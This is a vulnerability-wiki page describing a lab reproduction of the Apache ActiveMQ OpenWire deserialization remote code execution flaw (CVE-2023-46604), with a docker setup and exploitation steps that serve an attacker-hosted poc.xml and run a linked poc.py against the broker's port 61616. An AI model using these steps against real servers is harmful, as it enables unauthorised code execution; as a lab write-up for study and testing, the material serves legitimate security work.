<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/ActiveMQ/CVE-2023-46604/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Apache ActiveMQ OpenWire Protocol Deserialization RCE (CVE-2023-46604) - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Apache ActiveMQ OpenWire Protocol Deserialization RCE (CVE-2023-46604)", url: "#_top", children: [
              {title: "Environment setup", url: "#environment-setup" },
              {title: "Exploit", url: "#exploit" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        Apache ActiveMQ OpenWire 协议反序列化命令执行漏洞（CVE-2023-46604）
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../CVE-2022-41678/README.zh-cn/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../CVE-2022-41678/README.zh-cn/" class="btn btn-xs btn-link">
        Apache ActiveMQ Jolokia 后台远程代码执行漏洞（CVE-2022-41678）
      </a>
    </div>
    
  </div>

    

    <h1 id="apache-activemq-openwire-protocol-deserialization-rce-cve-2023-46604">Apache ActiveMQ OpenWire Protocol Deserialization RCE (CVE-2023-46604)<a class="headerlink" href="#apache-activemq-openwire-protocol-deserialization-rce-cve-2023-46604" title="Permanent link">&para;</a></h1>
<p><a href="README.zh-cn/">中文版本(Chinese version)</a></p>
<p>Apache ActiveMQ is an open source messaging middleware developed by the American Pachitea (Apache) Software Foundation that supports Java messaging services, clustering, Spring framework, and more.</p>
<p>OpenWire protocol is designed by ActiveMQ, to allow native access to ActiveMQ from a number of different languages and platforms. Apache ActiveMQ prior to 5.18.2 was affected by a deserialization vulnerability. This vulnerability may allow remote attackers with network access privileges to execute arbitrary shell commands by manipulating the serialized class types in the OpenWire protocol, leading to the instantiation of any class on the classpath of the agent.</p>
<p>References:</p>
<ul>
<li><a href="https://activemq.apache.org/news/cve-2023-46604">https://activemq.apache.org/news/cve-2023-46604</a></li>
<li><a href="https://xz.aliyun.com/t/12929">https://xz.aliyun.com/t/12929</a></li>
<li><a href="https://boogipop.com/2023/11/03/Apache%20ActiveMQ%20CVE-2023-46604%20RCE%20%E5%88%86%E6%9E%90/">https://boogipop.com/2023/11/03/Apache%20ActiveMQ%20CVE-2023-46604%20RCE%20%E5%88%86%E6%9E%90/</a></li>
<li><a href="https://forum.butian.net/share/2566">https://forum.butian.net/share/2566</a></li>
</ul>
<h2 id="environment-setup">Environment setup<a class="headerlink" href="#environment-setup" title="Permanent link">&para;</a></h2>
<p>ActiveMQ listens to following 2 ports:</p>
<table>
<thead>
<tr>
<th>Default port</th>
<th>Default Condition</th>
</tr>
</thead>
<tbody>
<tr>
<td>8161 (web)</td>
<td>Remote access requires configuration</td>
</tr>
<tr>
<td>61616 (tcp)</td>
<td>Remote access allowed</td>
</tr>
</tbody>
</table>
<p>The deserialization issue exists in the port 61616.</p>
<p>Enter following commands to run a ActiveMQ 5.17.3 server:</p>
<div class="highlight"><pre><span></span><code>docker compose up -d
</code></pre></div>
<p>Please access <code>http://your-ip:8161</code> to confirm that the service has started successfully before exploitation, although we only need to use the port 61616 after that.</p>
<h2 id="exploit">Exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h2>
<p>You can quickly start an HTTP server in the folder where the <a href="poc.xml">poc.xml</a> file is located using the Python3 http.server module:</p>
<div class="highlight"><pre><span></span><code>python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">6666</span>
</code></pre></div>
<p>Then execute the <a href="poc.py">poc.py</a>:</p>
<div class="highlight"><pre><span></span><code>python3<span class="w"> </span>poc.py<span class="w"> </span>target<span class="w"> </span>port<span class="w"> </span>http://ip<span class="w"> </span>of<span class="w"> </span>http<span class="w"> </span>server/poc.xml
</code></pre></div>
<p>You can check inside the ActiveMQ container using the following command:</p>
<div class="highlight"><pre><span></span><code>docker exec cve-2023-46604-activemq-1 ls -l /tmp
</code></pre></div>
<p>If you see the output showing that touch /tmp/activeMQ-RCE-success has been executed successfully, then the exploit has worked.</p>
<p><img alt="01.png" src="01.png" /></p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        Apache ActiveMQ OpenWire 协议反序列化命令执行漏洞（CVE-2023-46604）
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../CVE-2022-41678/README.zh-cn/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../CVE-2022-41678/README.zh-cn/" class="btn btn-xs btn-link">
        Apache ActiveMQ Jolokia 后台远程代码执行漏洞（CVE-2022-41678）
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>